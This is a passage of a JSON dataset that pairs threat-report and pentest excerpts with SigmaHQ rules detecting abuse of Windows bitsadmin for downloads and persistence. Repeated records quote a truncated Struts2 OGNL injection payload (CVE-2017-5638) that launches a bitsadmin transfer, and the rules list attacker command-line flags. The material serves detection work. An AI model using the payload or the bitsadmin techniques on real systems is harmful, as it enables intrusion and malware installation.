    "markdown": "# Internet Storm Center ## Threat Level: green --- # Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware **Published**: 2017-04-06. **Last Updated**: 2017-04-06 1 comment(s) --- We do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here. Since about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware. ``` %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' <strong> <span style=\"color:#c0392b\"> BITSAdmin.exe /Transfer JOB",
    "sigma_rule": {
      "title": "Suspicious Download From Direct IP Via Bitsadmin",
      "id": "99c840f2-2012-46fd-9141-c761987550ef",
      "related": [
        {
          "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_extension": {
          "CommandLine|contains": [
            "://1",
            "://2",
            "://3",
            "://4",
            "://5",
            "://6",
            "://7",
            "://8",
            "://9"
          ]
        },
        "filter_seven_zip": {
          "CommandLine|contains": "://7-"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_direct_ip.yml"
  },
  "68": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe - Alternate data streams - Download - Copy - Execute Used for managing background intelligent transfer ## Paths: - C:\\Windows\\System32\\bitsadmin.exe - C:\\Windows\\SysWOW64\\bitsadmin.exe ## Resources: - https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - https://www.youtube.com/watch?v=_8xJaaQlpBo - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f ## Detections: - Sigma: proc_creation_win_bitsadmin_download.yml - Sigma: proxy_ua_bitsadmin_susp_tld.yml - Sigma: proc_creation_win_bitsadmin_potential_persistence.yml - Splunk: bitsadmin_download_file.yml - IOC: Child process from bitsadmin.exe - IOC: bitsadmin creates new files - IOC: bitsadmin adds data to alternate data stream ## Alternate data streams ### Create a bitsadmin job 1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data",
    "sigma_rule": {
      "title": "Suspicious Download From Direct IP Via Bitsadmin",
      "id": "99c840f2-2012-46fd-9141-c761987550ef",
      "related": [
        {
          "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_extension": {
          "CommandLine|contains": [
            "://1",
            "://2",
            "://3",
            "://4",
            "://5",
            "://6",
            "://7",
            "://8",
            "://9"
          ]
        },
        "filter_seven_zip": {
          "CommandLine|contains": "://7-"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_direct_ip.yml"
  },
  "69": {
    "url": "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/",
    "markdown": "# Breaking the silence - Recent Truebot activity December 8, 2022 Since August 2022, we have seen an increase in infections of Truebot (aka Silence.Downloader) malware. Truebot was first identified in 2017 and researchers have linked it to a threat actor called Silence Group that is responsible for several high-impact attacks on financial institutions in several countries around the world. There are claims by other researchers that this group is associated with the well-known threat actor TA505 (aka Evil Corp). In our research, we found that one of the new follow-on payloads that Truebot drops is Grace (aka FlawedGrace and",
    "sigma_rule": {
      "title": "Suspicious Download From Direct IP Via Bitsadmin",
      "id": "99c840f2-2012-46fd-9141-c761987550ef",
      "related": [
        {
          "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file using an URL that contains an IP",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_extension": {
          "CommandLine|contains": [
            "://1",
            "://2",
            "://3",
            "://4",
            "://5",
            "://6",
            "://7",
            "://8",
            "://9"
          ]
        },
        "filter_seven_zip": {
          "CommandLine|contains": "://7-"
        },
        "condition": "all of selection_* and not 1 of filter_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_direct_ip.yml"
  },
  "70": {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File **Network Pentesting | June 16, 2014** --- Pentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files. There are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-05-30",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\",
            "\\Desktop\\",
            "%ProgramData%",
            "%public%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_susp_targetfolder.yml"
  },
  "71": {
    "url": "https://isc.sans.edu/diary/22264",
    "markdown": "# Internet Storm Center ## Threat Level: green --- # Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware **Published**: 2017-04-06. **Last Updated**: 2017-04-06 1 comment(s) --- We do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here. Since about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware. ``` %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' <strong> <span style=\"color:#c0392b\"> BITSAdmin.exe /Transfer JOB",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-05-30",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\",
            "\\Desktop\\",
            "%ProgramData%",
            "%public%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_susp_targetfolder.yml"
  },
  "72": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe - Alternate data streams - Download - Copy - Execute Used for managing background intelligent transfer ## Paths: - C:\\Windows\\System32\\bitsadmin.exe - C:\\Windows\\SysWOW64\\bitsadmin.exe ## Resources: - https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - https://www.youtube.com/watch?v=_8xJaaQlpBo - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f ## Detections: - Sigma: proc_creation_win_bitsadmin_download.yml - Sigma: proxy_ua_bitsadmin_susp_tld.yml - Sigma: proc_creation_win_bitsadmin_potential_persistence.yml - Splunk: bitsadmin_download_file.yml - IOC: Child process from bitsadmin.exe - IOC: bitsadmin creates new files - IOC: bitsadmin adds data to alternate data stream ## Alternate data streams ### Create a bitsadmin job 1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-05-30",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\",
            "\\Desktop\\",
            "%ProgramData%",
            "%public%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_susp_targetfolder.yml"
  },
  "73": {
    "url": "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/",
    "markdown": "# Breaking the silence - Recent Truebot activity December 8, 2022 Since August 2022, we have seen an increase in infections of Truebot (aka Silence.Downloader) malware. Truebot was first identified in 2017 and researchers have linked it to a threat actor called Silence Group that is responsible for several high-impact attacks on financial institutions in several countries around the world. There are claims by other researchers that this group is associated with the well-known threat actor TA505 (aka Evil Corp). In our research, we found that one of the new follow-on payloads that Truebot drops is Grace (aka FlawedGrace and",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To A Suspicious Target Folder",
      "id": "2ddef153-167b-4e89-86b6-757a9e65dcac",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to a suspicious target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-05-30",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            ":\\Perflogs",
            ":\\ProgramData\\",
            ":\\Temp\\",
            ":\\Users\\Public\\",
            ":\\Windows\\",
            "\\AppData\\Local\\Temp\\",
            "\\AppData\\Roaming\\",
            "\\Desktop\\",
            "%ProgramData%",
            "%public%"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_susp_targetfolder.yml"
  },
  "74": {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File **Network Pentesting | June 16, 2014** --- Pentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files. There are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To An Uncommon Target Folder",
      "id": "6e30c82f-a9f8-4aab-b79c-7c12bce6f248",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to uncommon target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            "%AppData%",
            "%temp%",
            "%tmp%",
            "\\AppData\\Local\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml"
  },
  "75": {
    "url": "https://isc.sans.edu/diary/22264",
    "markdown": "# Internet Storm Center ## Threat Level: green --- # Java Struts2 Vulnerability Used To Install Cerber Crypto Ransomware **Published**: 2017-04-06. **Last Updated**: 2017-04-06 1 comment(s) --- We do have a special webcast about the Struts2 Vulnerability scheduled for 11am ET today. Sign up here. Since about a month, we are tracking numerous attempts to exploit the Java Struts2 vulnerability (CVE-2017-5638). Typically, the exploits targeted Unix systems with simple Perl backdoors and bots. But recently, I saw a number of exploit attempts targeting Windows systems using a variant of the Cerber ransomware. ``` %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=' <strong> <span style=\"color:#c0392b\"> BITSAdmin.exe /Transfer JOB",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To An Uncommon Target Folder",
      "id": "6e30c82f-a9f8-4aab-b79c-7c12bce6f248",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to uncommon target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            "%AppData%",
            "%temp%",
            "%tmp%",
            "\\AppData\\Local\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml"
  },
  "76": {
    "url": "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
    "markdown": "# /Bitsadmin.exe - Alternate data streams - Download - Copy - Execute Used for managing background intelligent transfer ## Paths: - C:\\Windows\\System32\\bitsadmin.exe - C:\\Windows\\SysWOW64\\bitsadmin.exe ## Resources: - https://www.slideshare.net/chrisgates/windows-attacks-at-is-the-new-black-26672679 - https://www.youtube.com/watch?v=_8xJaaQlpBo - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f ## Detections: - Sigma: proc_creation_win_bitsadmin_download.yml - Sigma: proxy_ua_bitsadmin_susp_tld.yml - Sigma: proc_creation_win_bitsadmin_potential_persistence.yml - Splunk: bitsadmin_download_file.yml - IOC: Child process from bitsadmin.exe - IOC: bitsadmin creates new files - IOC: bitsadmin adds data to alternate data stream ## Alternate data streams ### Create a bitsadmin job 1. Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To An Uncommon Target Folder",
      "id": "6e30c82f-a9f8-4aab-b79c-7c12bce6f248",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to uncommon target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            "%AppData%",
            "%temp%",
            "%tmp%",
            "\\AppData\\Local\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml"
  },
  "77": {
    "url": "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/",
    "markdown": "# Breaking the silence - Recent Truebot activity December 8, 2022 Since August 2022, we have seen an increase in infections of Truebot (aka Silence.Downloader) malware. Truebot was first identified in 2017 and researchers have linked it to a threat actor called Silence Group that is responsible for several high-impact attacks on financial institutions in several countries around the world. There are claims by other researchers that this group is associated with the well-known threat actor TA505 (aka Evil Corp). In our research, we found that one of the new follow-on payloads that Truebot drops is Grace (aka FlawedGrace and",
    "sigma_rule": {
      "title": "File Download Via Bitsadmin To An Uncommon Target Folder",
      "id": "6e30c82f-a9f8-4aab-b79c-7c12bce6f248",
      "status": "test",
      "description": "Detects usage of bitsadmin downloading a file to uncommon target folder",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2023-02-15",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197",
        "attack.s0190",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_flags": {
          "CommandLine|contains": [
            " /transfer ",
            " /create ",
            " /addfile "
          ]
        },
        "selection_folder": {
          "CommandLine|contains": [
            "%AppData%",
            "%temp%",
            "%tmp%",
            "\\AppData\\Local\\",
            "C:\\Windows\\Temp\\"
          ]
        },
        "condition": "all of selection_*"
      },
      "fields": [
        "CommandLine",
        "ParentCommandLine"
      ],
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_download_uncommon_targetfolder.yml"
  },
  "78": {
    "url": "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
    "markdown": "# Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser **October 28, 2020** --- Throughout 2020, ransomware activity has become increasingly prolific, relying on an ecosystem of distinct but co-enabling operations to gain access to targets of interest before conducting extortion. Mandiant Threat Intelligence has tracked several loader and backdoor campaigns that lead to the post-compromise deployment of ransomware, sometimes within 24 hours of initial compromise. Effective and fast detection of these campaigns is key to mitigating this threat. The malware families enabling these attacks previously reported by Mandiant to intelligence subscribers include KEGTAP/BEERBOT, SINGLEMALT/STILLBOT, and WINEKEY/CORKBOT. While these",
    "sigma_rule": {
      "title": "Monitoring For Persistence Via BITS",
      "id": "b9cbbc17-d00d-4e3d-a827-b06d03d2380d",
      "status": "test",
      "description": "BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished.\nWhen the job runs on the system the command specified in the BITS job will be executed.\nThis can be abused by actors to create a backdoor within the system and for persistence.\nIt will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded.\n",
      "references": [
        "https://cloud.google.com/blog/topics/threat-intelligence/kegtap-and-singlemalt-with-a-ransomware-chaser/",
        "http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html",
        "https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394"
      ],
      "author": "Sreeman",
      "date": "2020-10-29",
      "modified": "2024-01-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\bitsadmin.exe"
          },
          {
            "OriginalFileName": "bitsadmin.exe"
          }
        ],
        "selection_cli_notify_1": {
          "CommandLine|contains": "/SetNotifyCmdLine"
        },
        "selection_cli_notify_2": {
          "CommandLine|contains": [
            "%COMSPEC%",
            "cmd.exe",
            "regsvr32.exe"
          ]
        },
        "selection_cli_add_1": {
          "CommandLine|contains": "/Addfile"
        },
        "selection_cli_add_2": {
          "CommandLine|contains": [
            "http:",
            "https:",
            "ftp:",
            "ftps:"
          ]
        },
        "condition": "selection_img and (all of selection_cli_notify_* or all of selection_cli_add_*)"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_bitsadmin_potential_persistence.yml"
  },
  "79": {
    "url": "http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html",
    "markdown": "# Temporal Persistence with bitsadmin and schtasks ### - Leaving a Key Under the Mat - **Why Do This:** On a recent engagement, I ran into a well-meaning individual who, after being briefed about our team's access to their network, decided to reboot compromised hosts and change user credentials in the middle of the testing. After losing multiple shells that weren't actually being detected, I decided to spend that evening after work creating a method to let myself back in. There are numerous common persistence methods, however, leaving behind registry keys, start-up configurations, or any permanent files was strictly out",
    "sigma_rule": {
      "title": "Monitoring For Persistence Via BITS",
